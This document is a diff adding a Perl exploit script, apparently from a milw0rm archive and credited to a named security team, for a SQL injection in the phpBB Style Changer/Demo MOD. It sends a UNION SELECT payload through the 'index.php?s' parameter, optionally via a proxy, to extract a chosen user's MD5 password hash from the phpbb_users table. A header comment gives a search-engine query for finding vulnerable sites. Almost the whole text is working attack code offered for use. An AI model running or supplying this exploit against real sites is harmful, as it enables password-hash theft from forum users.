@@ -1,0 +1,71 @@
+#!/usr/bin/perl
+#########################################################
+#		 _______ _______ ______ 		#
+#		 |______ |______ |     \		#
+#		 ______| |______ |_____/		#
+#		                        		#
+#phpBB Style Changer/Demo Mod-->GET HASH EXPLOIT	#
+#Created By SkOd                                        #
+#SED security Team                                      #
+#http://www.sed-team.be                                 #
+#skod.uk@gmail.com                                      #
+#ISRAEL                                                 #
+#########################################################
+#google:
+#"Powered by phpBB" inurl:"index.php?s" OR inurl:"index.php?style"
+#########################################################
+
+################## Pr0xy support by B0uncer777
+
+use IO::Socket;
+$|=1;
+if (@ARGV < 4){
+print q{
+############################################################
+#   phpBB Style Changer\Viewer MOD SQL injection Exploit   #
+#		Tested on phpBB 2.0.19			   #
+#	    created By SkOd. SED Security Team             #
+############################################################
+	bbstyle.pl [HOST] [PATH] [Target id] [proxy:port]
+	 bbstyle.pl www.host.com /phpbb2/ 2 127.0.0.1:1337
+############################################################
+#################Pr0xy support by B0uncer777################
+############################################################
+};
+exit;
+}
+
+$serv = $ARGV[0];
+
+
+$dir = $ARGV[1];
+$id = $ARGV[2];
+                                        @tmp=split(":",$ARGV[3]);
+$proxy = $tmp[0];
+$proxyport = $tmp[1];
+
+
+$path = $dir.'index.php?s=-99%20UNION%20SELECT%20null,user_password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20phpbb_users%20Where%20user_id='.$id.'/*';
+
+print "[~]Connecting to $serv through $proxy:$proxyport...";
+$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$proxy", PeerPort => "$proxyport") || die " failed !\n";
+print " ok\n";
+
+print "[~] Sending payload...";
+print $socket "GET http://$serv$path HTTP/1.1\n";
+print $socket "Host: $serv\n";
+print $socket "Accept: */*\n";
+print $socket "Proxy-Connection: keep-alive\n\n";
+print "ok\n[~] Waiting for reply...\n";
+
+while ($hash = <$socket>){
+print $hash."\n";
+if ($hash =~ m/open(.*?)template/)
+    {
+    print "[+]User id: $id\n[+]Md5 Hash: $1\n";
+    exit();
+    }
+}
+print "[-] Hash not found...\n";
+exit();
+# milw0rm.com [2006-02-05]
